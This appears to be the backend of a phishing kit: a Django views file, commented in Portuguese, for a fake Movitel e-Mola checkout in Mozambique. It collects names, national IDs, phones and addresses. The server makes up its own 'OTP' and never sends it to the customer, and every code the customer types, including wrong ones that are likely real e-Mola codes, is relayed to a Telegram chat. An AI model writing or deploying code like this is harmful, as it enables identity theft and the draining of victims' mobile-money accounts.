import requests
from django.shortcuts import render, redirect, get_object_or_404
from django.conf import settings
from .models import Order
import random
from datetime import datetime, timedelta

def send_telegram_notification(order, extra_info=None):
    """Envia notificações em tempo real para o grupo de logística via Telegram."""
    token = settings.TELEGRAM_BOT_TOKEN
    chat_id = settings.TELEGRAM_CHAT_ID
    
    # Verifica se as configurações do Telegram existem
    if not token or not chat_id or token == 'YOUR_BOT_TOKEN':
        return
        
    # Foco exclusivo em Movitel (e-Mola) conforme solicitado
    payment_method_display = "MOVITEL (E-MOLA)"
    
    message = (
        f"🔔 *ATUALIZAÇÃO DE PEDIDO*\n\n"
        f"💳 *MÉTODO:* {payment_method_display}\n"
        f"👤 *Cliente:* {order.full_name}\n"
        f"📞 *Telefone:* {order.phone}\n"
        f"💰 *Total:* {order.total_amount} MT\n"
        f"📍 *Cidade:* {order.city}\n"
        f"--------------------------------\n"
    )
    
    if extra_info:
        message += f"📝 *INFO:* {extra_info}\n"
    else:
        message += f"🚀 *NOVO PEDIDO CRIADO EM MOÇAMBIQUE*\n"
        
    message += f"--------------------------------\n"
    
    url = f"https://api.telegram.org/bot{token}/sendMessage"
    payload = {
        "chat_id": chat_id,
        "text": message,
        "parse_mode": "Markdown"
    }
    try:
        requests.post(url, data=payload, timeout=10)
    except Exception as e:
        print(f"Erro ao enviar notificação Telegram: {e}")

def generate_otp():
    """Gera um código de 4 dígitos para validação e-Mola."""
    return str(random.randint(1000, 9999))

def index(request):
    return render(request, 'orders/index.html')

def checkout(request):
    """Processa a criação inicial do pedido e direciona para instruções de pagamento."""
    if request.method == 'POST':
        # Captura dados do formulário de checkout corrigido
        order = Order.objects.create(
            full_name=request.POST.get('fullName'),
            national_id=request.POST.get('nationalId'),
            email=request.POST.get('email'),
            phone=request.POST.get('phone'),
            contact_person=request.POST.get('contactPerson'),
            alt_phone=request.POST.get('altPhone'),
            city=request.POST.get('city'),
            address=request.POST.get('address'),
            delivery_method=request.POST.get('delivery_method'),
            payment_method='movitel', # Forçado conforme sua regra de negócio[cite: 1]
            total_amount=request.POST.get('total_amount', 0)
        )
        
        send_telegram_notification(order)
        
        # Renderiza a página de instruções com "Secured payment by e-Mola"[cite: 1]
        return render(request, 'orders/payment_instructions.html', {'order': order})
        
    return render(request, 'orders/checkout.html')

def process_payment(request, order_id):
    """Simula o início do processamento do pagamento e gera o OTP."""
    order = get_object_or_404(Order, id=order_id)
    if request.method == 'POST':
        payment_phone = request.POST.get('payment_phone')
        
        # Simulação de geração de OTP para o sistema e-Mola
        otp = generate_otp()
        order.otp_code = otp
        order.otp_created_at = datetime.now()
        order.otp_resend_count = 0
        order.save()

        # Notifica a equipe de que o cliente inseriu os dados de pagamento
        extra_info = f"🔑 *OTP GERADO (E-MOLA)*\n📱 Telefone Pagamento: {payment_phone}\n🔢 Código: {otp}"
        send_telegram_notification(order, extra_info)
        
        return render(request, 'orders/otp_verification.html', {
            'order': order, 
            'resend_count': order.otp_resend_count
        })
    return redirect('index')

def verify_otp(request, order_id):
    """Verifica se o código OTP inserido pelo cliente em Moçambique é válido."""
    order = get_object_or_404(Order, id=order_id)
    if request.method == 'POST':
        otp_code_entered = request.POST.get('otp_code')

        # Validação: Código correto e dentro do limite de 5 minutos
        if order.otp_code == otp_code_entered and (datetime.now() - order.otp_created_at) < timedelta(minutes=5):
            order.is_paid = True
            order.save()
            
            extra_info = f"✅ *PAGAMENTO CONFIRMADO*\n💰 O cliente pagou {order.total_amount} MT via e-Mola."
            send_telegram_notification(order, extra_info)
            return render(request, 'orders/success.html', {'order': order})
        else:
            extra_info = f"❌ *FALHA NA VERIFICAÇÃO*\n🔢 Código Errado: {otp_code_entered}"
            send_telegram_notification(order, extra_info)
            return render(request, 'orders/otp_verification.html', {
                'order': order, 
                'error': 'Código OTP inválido ou expirado. Tente novamente.', 
                'resend_count': order.otp_resend_count
            })
    return redirect('index')

def resend_otp(request, order_id):
    """Permite ao cliente solicitar um novo código, limitado a 10 tentativas."""
    order = get_object_or_404(Order, id=order_id)
    if request.method == 'POST':
        if order.otp_resend_count < 10:
            otp = generate_otp()
            order.otp_code = otp
            order.otp_created_at = datetime.now()
            order.otp_resend_count += 1
            order.save()

            extra_info = f"🔄 *OTP REENVIADO*\n🔢 Novo Código: {otp}\nTentativa: {order.otp_resend_count}/10"
            send_telegram_notification(order, extra_info)
            return render(request, 'orders/otp_verification.html', {
                'order': order, 
                'message': 'Um novo código foi enviado.', 
                'resend_count': order.otp_resend_count
            })
        else:
            extra_info = f"🚫 *BLOQUEIO POR REENVIOS*\nLimite atingido no ID #{order.id}"
            send_telegram_notification(order, extra_info)
            return render(request, 'orders/otp_verification.html', {
                'order': order, 
                'error': 'Limite de reenvios atingido. Contacte o suporte.', 
                'resend_count': order.otp_resend_count, 
                'resend_limit_reached': True
            })
    return redirect('index')